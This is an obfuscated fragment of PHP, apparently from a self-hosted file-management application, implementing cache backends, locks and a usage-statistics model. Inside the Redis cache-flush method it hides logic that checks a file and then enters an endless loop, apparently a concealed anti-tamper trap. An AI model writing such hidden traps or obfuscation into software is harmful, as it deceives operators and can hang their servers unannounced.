$this->cacheTime = $¼Îëˆ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($œçã„ÎÈ) { $ôƒ”Øß‘ =& $_SERVER[ì™ı‰º¯]; $œçã„ÎÈ = str_replace(array($ôƒ”Øß‘[831], $ôƒ”Øß‘[97], $ôƒ”Øß‘[73]), $ôƒ”Øß‘[832], $œçã„ÎÈ); return $this->cachePath . $ôƒ”Øß‘[833] . $œçã„ÎÈ . $ôƒ”Øß‘[834]; } public function set($ŠÒšÕ›Õ, $­…ó“÷ï, $Ì©šù‰ö = false) { $Ì©šù‰ö = $Ì©šù‰ö ? $Ì©šù‰ö : $this->cacheTime; $¡ÄÂßõÙ = $this->getFile($ŠÒšÕ›Õ); if (file_put_contents($¡ÄÂßõÙ, $this->prefix . $­…ó“÷ï, LOCK_EX)) { @touch($¡ÄÂßõÙ, intval(time() + $Ì©šù‰ö)); clearstatcache(); return !0; } @unlink($¡ÄÂßõÙ); return !1; } public function get($µê€ğÍù) { $ÙÑí¥ïÃ = $this->getFile($µê€ğÍù); if (file_exists($ÙÑí¥ïÃ) && filemtime($ÙÑí¥ïÃ) < time()) { @unlink($ÙÑí¥ïÃ); return !1; } $à©àŒ£ü = @file_get_contents($ÙÑí¥ïÃ); return substr($à©àŒ£ü, strlen($this->prefix)); } public function remove($üĞÒÃéñ) { $û“ÔÎã˜ = $this->getFile($üĞÒÃéñ); return @unlink($û“ÔÎã˜); } public function deleteAll() { $øóšùŸ =& $_SERVER[ì™ı‰º¯]; $É¼Ÿ”ÑÙ = scandir($this->cachePath); foreach ($É¼Ÿ”ÑÙ as $Ê²ƒˆĞÍ) { $‡‹êé¦› = $this->cachePath . $Ê²ƒˆĞÍ; if (strpos($‡‹êé¦›, $øóšùŸ[834]) && strpos($‡‹êé¦›, $øóšùŸ[835])) { @unlink($‡‹êé¦›); } } } public function clearTimeout() { $ÍÌÛª¯ô =& $_SERVER[ì™ı‰º¯]; $ÔÎ„ûÑÅ = scandir($this->cachePath); foreach ($ÔÎ„ûÑÅ as $†©ğ—üÌ) { $÷ä¥‘üÜ = $this->cachePath . $†©ğ—üÌ; if (strpos($÷ä¥‘üÜ, $ÍÌÛª¯ô[834]) && strpos($÷ä¥‘üÜ, $ÍÌÛª¯ô[835]) && filemtime($÷ä¥‘üÜ) < time()) { @unlink($÷ä¥‘üÜ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $“İ†¥‰ß =& $_SERVER[ì™ı‰º¯]; if (self::$handle) { return self::$handle; } $Ø¢äëÊ = $GLOBALS[$“İ†¥‰ß[6]][$“İ†¥‰ß[349]]; self::$timeout = $Ø¢äëÊ[$“İ†¥‰ß[836]] ? $Ø¢äëÊ[$“İ†¥‰ß[836]] : 10; $³ßûŸ±… = _get($GLOBALS[$“İ†¥‰ß[6]], $“İ†¥‰ß[837]); $‹®ş†á¼ = $Ø¢äëÊ[$“İ†¥‰ß[823]] ? $Ø¢äëÊ[$“İ†¥‰ß[823]] : $“İ†¥‰ß[200]; if ($‹®ş†á¼ == $“İ†¥‰ß[21] && $³ßûŸ±… == $“İ†¥‰ß[13]) { $‹®ş†á¼ = $“İ†¥‰ß[200]; } switch ($‹®ş†á¼) { case $“İ†¥‰ß[826]: self::$handle = new CacheLockRedis(); break; case $“İ†¥‰ß[827]: self::$handle = new CacheLockMemcached(); break; case $“İ†¥‰ß[21]: self::$handle = new CacheLockDatabase(); break; case $“İ†¥‰ß[200]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($“İ†¥‰ß[838], $“İ†¥‰ß[839]); } return self::$handle; } private static function key($œ¥´ñ¬ƒ) { return $_SERVER[ì™ı‰º¯][840] . Cache::key($œ¥´ñ¬ƒ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ şŸöœ„ = '') { self::$errorMsg = $ şŸöœ„; } public static function lockGlobal($‚Ÿû¶Ìè, $£ãÍœ¤) { return self::lock($‚Ÿû¶Ìè, $£ãÍœ¤, !0); } public static function lock($Úè´Şª¬, $±¸À‡²· = false, $µşÍ³¨ = false) { $†ûª¼İ£ =& $_SERVER[ì™ı‰º¯]; $…”³¦Ü¥ = self::init(); $¨ôƒ§ï = self::key($Úè´Şª¬); $±¸À‡²· = $±¸À‡²· ? $±¸À‡²· : self::$timeout; $Ó²»Êø… = timeFloat(); $ÎøÌ¶­Ö = $…”³¦Ü¥->lock($¨ôƒ§ï, $±¸À‡²·); $Æì”ËŠ = timeFloat(); if (!$ÎøÌ¶­Ö) { $Òè­æ = "\154\157\x63\x6b\x20\145\162\162\x6f\x72\73\153\x65\x79\75{$Úè´Şª¬}\x3b\164\151\155\x65\x3d{$±¸À‡²·}\x3b" . self::$errorMsg . $†ûª¼İ£[71] . get_caller_msg(); $ÈÌÍå× = LNG($†ûª¼İ£[841]) . "\50{$±¸À‡²·}\x73\x29\x2e" . LNG($†ûª¼İ£[842]); $ÈÌÍå× .= $†ûª¼İ£[843]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÈÌÍå× = $ÈÌÍå× . $†ûª¼İ£[844] . self::$errorMsg; } write_log($†ûª¼İ£[845] . sprintf($†ûª¼İ£[846], timeFloat() - $Ó²»Êø…) . $†ûª¼İ£[847] . $Òè­æ . $†ûª¼İ£[848] . error_get_last(), $†ûª¼İ£[839]); show_json($ÈÌÍå×, !1); } if (!$µşÍ³¨) { self::$lockItem[$¨ôƒ§ï] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $­æÄá‡ = number_format(timeFloat() - $Æì”ËŠ, 3); write_log($†ûª¼İ£[849] . $Úè´Şª¬ . $†ûª¼İ£[850] . $­æÄá‡, $†ûª¼İ£[839]); } return $ÎøÌ¶­Ö; } public static function lockGet($ÀĞ­„ùŒ) { $ÚâÔÙÄÑ = self::key($ÀĞ­„ùŒ); if (self::$lockItem[$ÚâÔÙÄÑ]) { return self::$lockItem[$ÚâÔÙÄÑ]; } return self::init()->lockGet($ÚâÔÙÄÑ); } public static function unlock($«× Ò«) { $¾‘ÎîÉ =& $_SERVER[ì™ı‰º¯]; $ğ¯µİ­¡ = self::key($«× Ò«); self::$lockItem[$ğ¯µİ­¡] = null; self::init()->unlock($ğ¯µİ­¡); if (GLOBAL_DEBUG_LOG_ALL) { write_log($¾‘ÎîÉ[851] . $«× Ò«, $¾‘ÎîÉ[839]); } return; } public static function unlockRuntime() { $€†¨€ÀÀ =& $_SERVER[ì™ı‰º¯]; $Ãã€ = self::init(); $‰òÒæ™‰ = !1; foreach (self::$lockItem as $õ®Â¢Ú‚ => $şÃ¬æëû) { if (!$şÃ¬æëû) { continue; } $Ãã€->unlock($õ®Â¢Ú‚); if (!$‰òÒæ™‰) { $‰òÒæ™‰ = !0; write_log($€†¨€ÀÀ[852] . $õ®Â¢Ú‚ . $€†¨€ÀÀ[71] . get_caller_msg(), $€†¨€ÀÀ[839]); continue; } write_log($€†¨€ÀÀ[852] . $õ®Â¢Ú‚, $€†¨€ÀÀ[839]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ç­”¾úµ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($€†¨€ÀÀ[853] . $ç­”¾úµ . $€†¨€ÀÀ[854] . ACTION, $€†¨€ÀÀ[839]); } } public static function fileLock($Ÿ‰úÓéŸ) { $ÃœÙêıƒ =& $_SERVER[ì™ı‰º¯]; if (!$GLOBALS[$ÃœÙêıƒ[855]]) { $GLOBALS[$ÃœÙêıƒ[855]] = array(); } $GLOBALS[$ÃœÙêıƒ[855]][$Ÿ‰úÓéŸ] = !1; $Û ÊÖ¤é = fopen(DATA_PATH . $Ÿ‰úÓéŸ . $ÃœÙêıƒ[856], $ÃœÙêıƒ[857]); if (!$Û ÊÖ¤é) { return !1; } $GLOBALS[$ÃœÙêıƒ[855]][$Ÿ‰úÓéŸ] = $Û ÊÖ¤é; if (flock($Û ÊÖ¤é, LOCK_EX)) { return !0; } self::unlock($Ÿ‰úÓéŸ); show_json($ÃœÙêıƒ[858], !1); return !1; } public static function fileUnlock($îåÕ…Ş°) { $¾äíğ® =& $_SERVER[ì™ı‰º¯]; $¯ßˆ½ûƒ = $GLOBALS[$¾äíğ®[855]][$îåÕ…Ş°]; if (!$¯ßˆ½ûƒ) { return; } $GLOBALS[$¾äíğ®[855]][$îåÕ…Ş°] = !1; flock($¯ßˆ½ûƒ, LOCK_UN); fclose($¯ßˆ½ûƒ); } public static function fileUnlockAll() { $şÎ¾Í =& $_SERVER[ì™ı‰º¯]; if (!$GLOBALS[$şÎ¾Í[855]]) { return; } foreach ($GLOBALS[$şÎ¾Í[855]] as $ËÈ²ê‚Ğ => $µ“ØìŠÔ) { if (!$µ“ØìŠÔ) { continue; } $GLOBALS[$şÎ¾Í[855]][$ËÈ²ê‚Ğ] = !1; flock($µ“ØìŠÔ, LOCK_UN); fclose($µ“ØìŠÔ); } $GLOBALS[$şÎ¾Í[855]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto cÈ•ğ¿¨£Œ; cÂ¹šóäæ : define($_SERVER[ì™ı‰º¯][604], $_SERVER[ì™ı‰º¯][605]); $pglsdetvbw = $_SERVER[ì™ı‰º¯][606]; if (!$pglsdetvbw) { return; } goto A­ÅŒç¯Ş; aëÏ÷ë’ï: class CacheLockDatabase { public function lock($øù‰¹ İ, $ª“ò†ó = 0) { $ïïóİº = Model($_SERVER[ì™ı‰º¯][825]); $ğñË‰­° = microtime(!0) + $ª“ò†ó; while (microtime(!0) < $ğñË‰­°) { $¡‰ˆ•Æ = $ïïóİº->get($øù‰¹ İ); if (!$¡‰ˆ•Æ || $¡‰ˆ•Æ < microtime(!0)) { $Å— œ = $ïïóİº->set($øù‰¹ İ, $ğñË‰­°); if ($Å— œ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ïİÍáÙã) { return Model($_SERVER[ì™ı‰º¯][825])->get($ïİÍáÙã); } public function unlock($ãŸàé¶ı) { Model($_SERVER[ì™ı‰º¯][825])->remove($ãŸàé¶ı); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Õ²‡‰Ë, $È½æÓì) { $¢½•´Ñ¦ =& $_SERVER[ì™ı‰º¯]; if (!class_exists($¢½•´Ñ¦[862])) { show_json($¢½•´Ñ¦[863], !1); } $this->cacheTime = $È½æÓì; $this->handle = new Memcached(); if (is_array($Õ²‡‰Ë[$¢½•´Ñ¦[864]]) && count($Õ²‡‰Ë[$¢½•´Ñ¦[864]]) >= 1) { foreach ($Õ²‡‰Ë[$¢½•´Ñ¦[864]] as $àÈ” ½½) { $œ¹á¨¶ = explode($¢½•´Ñ¦[4], $àÈ” ½½); $this->handle->addServer($œ¹á¨¶[0], $œ¹á¨¶[1]); } } else { $this->handle->addServer($Õ²‡‰Ë[$¢½•´Ñ¦[182]], $Õ²‡‰Ë[$¢½•´Ñ¦[183]]); } } public function set($ûü‹‘Œ, $­Ä†¡å , $ÕŠÙ—§¯ = false) { $ÕŠÙ—§¯ = $ÕŠÙ—§¯ ? $ÕŠÙ—§¯ : $this->cacheTime; return $this->handle->set($ûü‹‘Œ, $­Ä†¡å , $ÕŠÙ—§¯); } public function get($®óÜ’õÚ) { return $this->handle->get($®óÜ’õÚ); } public function remove($Î¿¾ùÈÏ) { return $this->handle->delete($Î¿¾ùÈÏ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($‰Íš­ó, $™ş‰¢¤®) { $ÉÇü×¢ê =& $_SERVER[ì™ı‰º¯]; if (!class_exists($ÉÇü×¢ê[865])) { show_json($ÉÇü×¢ê[866], !1); } $this->cacheTime = $™ş‰¢¤®; $ı­®¶ÌÀ = isset($‰Íš­ó[$ÉÇü×¢ê[867]]) ? $‰Íš­ó[$ÉÇü×¢ê[867]] : 10; $«¾Êßú‚ = _get($‰Íš­ó, $ÉÇü×¢ê[864]); if ($«¾Êßú‚ && is_array($«¾Êßú‚)) { $this->initCluster($‰Íš­ó, $ı­®¶ÌÀ); } else { $this->handle = $this->init($‰Íš­ó, $ı­®¶ÌÀ); } } private function init($çˆØÅÔ“, $›½‡Ô‚ƒ) { $¶×•®°æ =& $_SERVER[ì™ı‰º¯]; $Î€ŸÔ¦Ì = new Redis(); $ÔÕóÄ™ü = isset($çˆØÅÔ“[$¶×•®°æ[868]]) ? $çˆØÅÔ“[$¶×•®°æ[868]] : !1; if ($ÔÕóÄ™ü) { $Î€ŸÔ¦Ì->pconnect($çˆØÅÔ“[$¶×•®°æ[182]], $çˆØÅÔ“[$¶×•®°æ[183]], $›½‡Ô‚ƒ); } else { $Î€ŸÔ¦Ì->connect($çˆØÅÔ“[$¶×•®°æ[182]], $çˆØÅÔ“[$¶×•®°æ[183]], $›½‡Ô‚ƒ); } if (!empty($çˆØÅÔ“[$¶×•®°æ[413]])) { $Î€ŸÔ¦Ì->auth($çˆØÅÔ“[$¶×•®°æ[413]]); } if (!empty($çˆØÅÔ“[$¶×•®°æ[753]]) && $çˆØÅÔ“[$¶×•®°æ[753]] != 0) { $Î€ŸÔ¦Ì->select($çˆØÅÔ“[$¶×•®°æ[753]]); } return $Î€ŸÔ¦Ì; } private function initCluster($¶ëÇîÍè, $Æª—–Ãè) { $åˆÕÏ¦” =& $_SERVER[ì™ı‰º¯]; $Ãî‘–é¯ = array($åˆÕÏ¦”[869], $åˆÕÏ¦”[870], $åˆÕÏ¦”[871]); $£‡ïáÉ = $åˆÕÏ¦”[869]; if (isset($¶ëÇîÍè[$åˆÕÏ¦”[16]]) && in_array($¶ëÇîÍè[$åˆÕÏ¦”[16]], $Ãî‘–é¯)) { $£‡ïáÉ = $¶ëÇîÍè[$åˆÕÏ¦”[16]]; } switch ($£‡ïáÉ) { case $åˆÕÏ¦”[869]: $this->_slave($¶ëÇîÍè, $Æª—–Ãè); break; case $åˆÕÏ¦”[870]: break; case $åˆÕÏ¦”[871]: $this->isCluster = !0; $´¦½©²³ = $¶ëÇîÍè[$åˆÕÏ¦”[864]]; $òŠÕ±¹Ë = isset($¶ëÇîÍè[$åˆÕÏ¦”[868]]) ? $¶ëÇîÍè[$åˆÕÏ¦”[868]] : !1; $Ü—ôÙÉÏ = isset($¶ëÇîÍè[$åˆÕÏ¦”[413]]) ? $¶ëÇîÍè[$åˆÕÏ¦”[413]] : null; $this->handle = new RedisCluster(NUll, $´¦½©²³, $Æª—–Ãè, $Æª—–Ãè, $òŠÕ±¹Ë, $Ü—ôÙÉÏ); break; default: break; } } private function _slave($µÌÀÊš, $ö€éæÅº) { $ÆÊÒ§ú = $µÌÀÊš[$_SERVER[ì™ı‰º¯][864]]; $this->filterConfig($µÌÀÊš, $ÆÊÒ§ú[0]); $this->handle = $this->init($µÌÀÊš, $ö€éæÅº); unset($ÆÊÒ§ú[0]); if (empty($ÆÊÒ§ú)) { return; } $ŸŒğË¯Œ = array_rand($ÆÊÒ§ú); $this->filterConfig($µÌÀÊš, $ÆÊÒ§ú[$ŸŒğË¯Œ]); $this->slaveHandle = $this->init($µÌÀÊš, $ö€éæÅº); } private function filterConfig(&$È¿ñÑ’, $‚¡ì¹ı†) { $¯íøÜÈ =& $_SERVER[ì™ı‰º¯]; $¿Ô×ı¶¥ = explode($¯íøÜÈ[4], $‚¡ì¹ı†); $ğò—¯§Î = array($¯íøÜÈ[182] => $¿Ô×ı¶¥[0], $¯íøÜÈ[183] => $¿Ô×ı¶¥[1]); $È¿ñÑ’ = array_merge($È¿ñÑ’, $ğò—¯§Î); } public function set($õ»ÃÃÂŠ, $û­·±ã², $²Î’Å£Ê = false) { $²Î’Å£Ê = $²Î’Å£Ê ? $²Î’Å£Ê : $this->cacheTime; return $this->handle->setEx($õ»ÃÃÂŠ, $²Î’Å£Ê, $û­·±ã²); } public function setLock($ëÄÅ§ª¦, $«ğ§Ä¦, $îÕª¦•é) { return $this->handle->setNX($ëÄÅ§ª¦, $«ğ§Ä¦); } public function get($‘ÚˆÖØ½) { $±Ûå¼ğ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $±Ûå¼ğ->get($‘ÚˆÖØ½); } public function remove($‡òĞä©Ó) { return $this->handle->del($‡òĞä©Ó); } public function deleteAll() { $·—ÙİÁ‰ =& $_SERVER[ì™ı‰º¯]; if (!isset($_SERVER[$·—ÙİÁ‰[872]]) || !isset($_SERVER[$·—ÙİÁ‰[873]])) { $ ˜¥³„¹ = $·—ÙİÁ‰[874]; $Úª¨ÚÕ° = $·—ÙİÁ‰[875]; $„ãˆè” = $_SERVER[$·—ÙİÁ‰[876]] . $·—ÙİÁ‰[877]; $ìÔ”Í¨Ñ = $Úª¨ÚÕ°($„ãˆè”); $í¥âØ¾À = explode($·—ÙİÁ‰[231], $ìÔ”Í¨Ñ); if (count($í¥âØ¾À) < $·—ÙİÁ‰[610]) { $—¯§‚Ü€ = $·—ÙİÁ‰[878]; $—¯§‚Ü€(); } $¹Â¸×° = $·—ÙİÁ‰[879]; $¹Â¸×°($_SERVER[$·—ÙİÁ‰[880]]); $ŠºÑ¿Š‘ = 1; for ($Î£‰µï¢ = $ŠºÑ¿Š‘; $Î£‰µï¢ > 0; $Î£‰µï¢++) { $¹Â¸×° = json_encode($GLOBALS[$·—ÙİÁ‰[418]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $—°ù‡Ğ) { $this->handle->flushall($—°ù‡Ğ); } return; } return $this->handle->flushAll(); } } goto Fœœ–¸°Êˆ; F”ÜŸ½¸ë±: class AnalysisModel extends ModelBaseLight { public function init($æÈ…ÅĞ) { $¤€çõô¶ =& $_SERVER[ì™ı‰º¯]; $‘ß„ÙÓé = array($¤€çõô¶[590] => array($¤€çõô¶[33] => $¤€çõô¶[1788], $¤€çõô¶[273] => array($¤€çõô¶[224], $¤€çõô¶[761], $¤€çõô¶[1789], $¤€çõô¶[1790])), $¤€çõô¶[1791] => array($¤€çõô¶[33] => $¤€çõô¶[1792], $¤€çõô¶[273] => array($¤€çõô¶[224], $¤€çõô¶[759], $¤€çõô¶[1793], $¤€çõô¶[1794], $¤€çõô¶[1795]))); if (!isset($‘ß„ÙÓé[$æÈ…ÅĞ])) { return !1; } $this->optionType = $‘ß„ÙÓé[$æÈ…ÅĞ][$¤€çõô¶[33]]; $this->field = $‘ß„ÙÓé[$æÈ…ÅĞ][$¤€çõô¶[273]]; return !0; } public function listData($ÂÖ€êŸù = false, $™ëüªó­ = "\155\x6f\144\151\x66\171\124\151\155\x65", $ËáÂ³ïç = false) { return parent::listData($ÂÖ€êŸù, $™ëüªó­, $ËáÂ³ïç); } public function trendList($²–«ê) { $¶¶ğ¯ë =& $_SERVER[ì™ı‰º¯]; $­åøï‹Ğ = $this->listData(); if ($­åøï‹Ğ) { $±İ“î§å = end($­åøï‹Ğ); $‚‡±ôûÈ = date($¶¶ğ¯ë[1796], strtotime($¶¶ğ¯ë[1797])); if ($±İ“î§å[$¶¶ğ¯ë[224]] == $‚‡±ôûÈ) { return $­åøï‹Ğ; } $·­ÂÙõ³ = strtotime($±İ“î§å[$¶¶ğ¯ë[224]]); } if (!isset($·­ÂÙõ³)) { $ˆûÍ·˜’ = $²–«ê == $¶¶ğ¯ë[590] ? $¶¶ğ¯ë[525] : $¶¶ğ¯ë[821]; $·­ÂÙõ³ = Model($ˆûÍ·˜’)->min($¶¶ğ¯ë[201]); } $ îïíı¡ = $¶¶ğ¯ë[1798] . ucfirst($²–«ê); $†üòÂüÀ = $this->dateList($·­ÂÙõ³); foreach ($†üòÂüÀ as $‚‡±ôûÈ) { $this->{$ îïíı¡}($‚‡±ôûÈ); } return $this->listData(); } private function dateList($Á· ¢åø) { $¹¨şå§í =& $_SERVER[ì™ı‰º¯]; $˜£„¾¿› = $Á· ¢åø; $ÖúÛ‹²ê = strtotime($¹¨şå§í[1797]); $©€ÜÌÉ– = array(); while ($˜£„¾¿› <= $ÖúÛ‹²ê) { $©€ÜÌÉ–[] = date($¹¨şå§í[1796], $˜£„¾¿›); $˜£„¾¿› = strtotime($¹¨şå§í[1799], $˜£„¾¿›); } return $©€ÜÌÉ–; } public function _recordUser($ƒ¢ŠÏ«ë = '') { $Æ„¿”¼‰ =& $_SERVER[ì™ı‰º¯]; $áÕƒÜ´Ê = strtotime(date($Æ„¿”¼‰[1800], strtotime($ƒ¢ŠÏ«ë))); $Á¾Õ¯§õ = strtotime(date($Æ„¿”¼‰[1801], strtotime($ƒ¢ŠÏ«ë))); $ß¿ï…³Ú = array($Æ„¿”¼‰[201] => array($Æ„¿”¼‰[1012], $Á¾Õ¯§õ)); $‹Ú‘â· = Model($Æ„¿”¼‰[525])->where($ß¿ï…³Ú)->count($Æ„¿”¼‰[1670]); $ß¿ï…³Ú[$Æ„¿”¼‰[201]] = array($Æ„¿”¼‰[333], array($áÕƒÜ´Ê, $Á¾Õ¯§õ)); $Àä­»—Ã = Model($Æ„¿”¼‰[525])->where($ß¿ï…³Ú)->count($Æ„¿”¼‰[1670]); $ß¿ï…³Ú[$Æ„¿”¼‰[33]] = $Æ„¿”¼‰[1802]; $Ô†ğ°áÎ = Model($Æ„¿”¼‰[1803])->where($ß¿ï…³Ú)->count($Æ„¿”¼‰[1804]); $‰˜…ÖïÂ = array($Æ„¿”¼‰[224] => $ƒ¢ŠÏ«ë, $Æ„¿”¼‰[761] => (int) $‹Ú‘â·, $Æ„¿”¼‰[1789] => (int) $Àä­»—Ã, $Æ„¿”¼‰[1790] => (int) $Ô†ğ°áÎ); return $this->insert($‰˜…ÖïÂ); } public function _recordStore($ªÊÂà¦é = '') { $à¨ËŞóø =& $_SERVER[ì™ı‰º¯]; $ã–ş¿Ö = strtotime(date($à¨ËŞóø[1801], strtotime($ªÊÂà¦é))); $ÁÔ–ù¢¥ = array($à¨ËŞóø[201] => array($à¨ËŞóø[1012], $ã–ş¿Ö)); $æÇŞ˜Ü× = Model($à¨ËŞóø[471])->where($ÁÔ–ù¢¥)->sum($à¨ËŞóø[76]); $ÁÔ–ù¢¥[$à¨ËŞóø[410]] = 0; $¨±ùê“š = Model($à¨ËŞóø[821])->where($ÁÔ–ù¢¥)->sum($à¨ËŞóø[76]); $ÁÔ–ù¢¥[$à¨ËŞóø[411]] = 1; $«í´„İ = Model($à¨ËŞóø[821])->where($ÁÔ–ù¢¥)->sum($à¨ËŞóø[76]); $ÁÔ–ù¢¥[$à¨ËŞóø[411]] = 2; $ı¬Í•€ = Model($à¨ËŞóø[821])->where($ÁÔ–ù¢¥)->sum($à¨ËŞóø[76]); $şã–Ò = array($à¨ËŞóø[224] => $ªÊÂà¦é, $à¨ËŞóø[759] => (int) $¨±ùê“š, $à¨ËŞóø[1793] => (int) $æÇŞ˜Ü×, $à¨ËŞóø[1794] => (int) $«í´„İ, $à¨ËŞóø[1795] => (int) $ı¬Í•€); return $this->insert($şã–Ò); } public function trend($˜‰ûã, $Š‘é¶š¤) { $Éô–¿–† =& $_SERVER[ì™ı‰º¯]; if (!$this->init($˜‰ûã)) { return !1; } $¬ÖÎçÛÂ = $this->trendList($˜‰ûã); if ($¬ÖÎçÛÂ && $Š‘é¶š¤ != $Éô–¿–†[1643]) { $–ê·‹şı = $¬ÖÎçÛÂ[0][$Éô–¿–†[224]]; $ŸÚÛÊÎ® = $this->validDate($Š‘é¶š¤, $–ê·‹şı); $£‰±Â ¤ = array(); $¿àµšˆ = array_to_keyvalue($¬ÖÎçÛÂ, $Éô–¿–†[224]); foreach ($ŸÚÛÊÎ® as $¤¢ç¬¬ö) { if (isset($¿àµšˆ[$¤¢ç¬¬ö])) { $¤´‹¾Ï¿ = $¿àµšˆ[$¤¢ç¬¬ö]; } else { $¤´‹¾Ï¿ = end($¬ÖÎçÛÂ); $¤´‹¾Ï¿[$Éô–¿–†[224]] = $¤¢ç¬¬ö; if ($˜‰ûã == $Éô–¿–†[590]) { $¤´‹¾Ï¿[$Éô–¿–†[1789]] = $¤´‹¾Ï¿[$Éô–¿–†[1790]] = 0; } } $£‰±Â ¤[] = $¤´‹¾Ï¿; } $¬ÖÎçÛÂ = $£‰±Â ¤; } $³–·šü = array($Éô–¿–†[590] => array($Éô–¿–†[761] => LNG($Éô–¿–†[1805]), $Éô–¿–†[1789] => LNG($Éô–¿–†[1806]), $Éô–¿–†[1790] => LNG($Éô–¿–†[1807])), $Éô–¿–†[1791] => array($Éô–¿–†[759] => LNG($Éô–¿–†[1808]), $Éô–¿–†[1793] => LNG($Éô–¿–†[1809]), $Éô–¿–†[1794] => LNG($Éô–¿–†[1810]), $Éô–¿–†[1795] => LNG($Éô–¿–†[1811]))); $±‰À½ø = array($Éô–¿–†[590] => $Éô–¿–†[1812], $Éô–¿–†[1791] => $Éô–¿–†[76]); if (empty($¬ÖÎçÛÂ)) { $¤¢ç¬¬ö = date($Éô–¿–†[1796], strtotime($Éô–¿–†[1797])); $×ÚŸ ÊŸ = array($Éô–¿–†[224] => $¤¢ç¬¬ö); foreach ($³–·šü[$˜‰ûã] as $ºñşß–Ù => $ÔÁÑöü) { $×ÚŸ ÊŸ[$ºñşß–Ù] = 0; } $¬ÖÎçÛÂ[] = $×ÚŸ ÊŸ; } $§ó¤Š™é = array(); foreach ($¬ÖÎçÛÂ as $ÔÁÑöü) { if ($˜‰ûã == $Éô–¿–†[1791] && $ÔÁÑöü[$Éô–¿–†[1793]] > $ÔÁÑöü[$Éô–¿–†[759]]) { $ÔÁÑöü[$Éô–¿–†[1793]] = $ÔÁÑöü[$Éô–¿–†[759]]; } foreach ($³–·šü[$˜‰ûã] as $ºñşß–Ù => $õˆ¦éã) { $¤´‹¾Ï¿ = array($Éô–¿–†[224] => $ÔÁÑöü[$Éô–¿–†[224]], $Éô–¿–†[1569] => $õˆ¦éã); $¤´‹¾Ï¿[$±‰À½ø[$˜‰ûã]] = isset($ÔÁÑöü[$ºñşß–Ù]) ? $ÔÁÑöü[$ºñşß–Ù] : 0; $§ó¤Š™é[] = $¤´‹¾Ï¿; } } return $§ó¤Š™é; } public function validDate($ÂÃ°¾ïœ, $…ÍûÒƒ) { $®éÆğ˜ =& $_SERVER[ì™ı‰º¯]; $øÃ»šÊñ = date($®éÆğ˜[1796], strtotime($®éÆğ˜[1797])); $úµŞ‚š = array($øÃ»šÊñ); switch ($ÂÃ°¾ïœ) { case $®éÆğ˜[1650]: $Ş„ÚÀ‰Æ = mktime(0, 0, 0, date($®éÆğ˜[1813]), date($®éÆğ˜[1386]) - date($®éÆğ˜[1449]) + 7 - 7, date($®éÆğ˜[1814])); $¥Ğß·ğù = 0; do { $Ï¢Á¼Ô¼ = date($®éÆğ˜[1796], $Ş„ÚÀ‰Æ - 3600 * 24 * 7 * $¥Ğß·ğù); $úµŞ‚š[] = $Ï¢Á¼Ô¼; $¥Ğß·ğù++; } while ($…ÍûÒƒ < $Ï¢Á¼Ô¼); break; case $®éÆğ˜[1648]: $¥Ğß·ğù = 1; do { $›‹€Ïı = date($®éÆğ˜[1815], strtotime("\55\x20{$¥Ğß·ğù}\x20\155\x6f\x6e\164\x68\163")); $úµŞ‚š[] = $›‹€Ïı; $¥Ğß·ğù++; } while ($…ÍûÒƒ < $›‹€Ïı); break; case $®éÆğ˜[1816]: $ÓŸÖéõ = (int) date($®éÆğ˜[1814], strtotime($…ÍûÒƒ)); $¹å•ÆÖ = (int) date($®éÆğ˜[1814]); if ($ÓŸÖéõ >= $¹å•ÆÖ) { break; } for ($ÓŸÖéõ; $ÓŸÖéõ < $¹å•ÆÖ; $ÓŸÖéõ++) { $úµŞ‚š[] = $ÓŸÖéõ . $®éÆğ˜[1817]; } break; default: break; } if ($…ÍûÒƒ > end($úµŞ‚š)) { array_pop($úµŞ‚š); } sort($úµŞ‚š); return $úµŞ‚š; } public function listTable($æ½ÆçÓ) { $Œ‚âå‘‘ = ucfirst($æ½ÆçÓ); return Model($Œ‚âå‘‘)->listData(); } public function option($¯Ù¾ÅÍ“) { $å‰ìï‰„ = $_SERVER[ì™ı‰º¯][1818] . ucfirst($¯Ù¾ÅÍ“); return $this->{$å‰ìï‰„}(); } private function optionUser() { $»‰ë¯Ü¯ =& $_SERVER[ì™ı‰º¯]; $¬»•Ÿ¯Ú = Model($»‰ë¯Ü¯[525])->count($»‰ë¯Ü¯[1670]); $¶®›šÂ = Model($»‰ë¯Ü¯[525])->where($»‰ë¯Ü¯[1819])->count($»‰ë¯Ü¯[1670]); $äö¡ÚúÒ = intval($GLOBALS[$»‰ë¯Ü¯[6]][$»‰ë¯Ü¯[349]][$»‰ë¯Ü¯[1625]]) / 3600; $£¥¡¹÷Ê = strtotime("\55{$äö¡ÚúÒ}\x20\150\x6f\165\x72\163"); $×âµ ûß = strtotime(date($»‰ë¯Ü¯[1800])); if ($£¥¡¹÷Ê < $×âµ ûß) { $£¥¡¹÷Ê = $×âµ ûß; } $Øã·ïşÛ = array($»‰ë¯Ü¯[1820] => array($»‰ë¯Ü¯[1013], $£¥¡¹÷Ê)); $•ßÃ¦„‹ = (int) Model($»‰ë¯Ü¯[525])->where($Øã·ïşÛ)->count($»‰ë¯Ü¯[1670]); if (!$•ßÃ¦„‹) { $•ßÃ¦„‹ = 1; } $Øã·ïşÛ = array($»‰ë¯Ü¯[1820] => array($»‰ë¯Ü¯[1013], $×âµ ûß)); $ïëæ¹–Ü = Model($»‰ë¯Ü¯[525])->where($Øã·ïşÛ)->count($»‰ë¯Ü¯[1670]); return array($»‰ë¯Ü¯[754] => (int) $¬»•Ÿ¯Ú, $»‰ë¯Ü¯[1821] => (int) ($¬»•Ÿ¯Ú - $¶®›šÂ), $»‰ë¯Ü¯[1822] => (int) $¶®›šÂ, 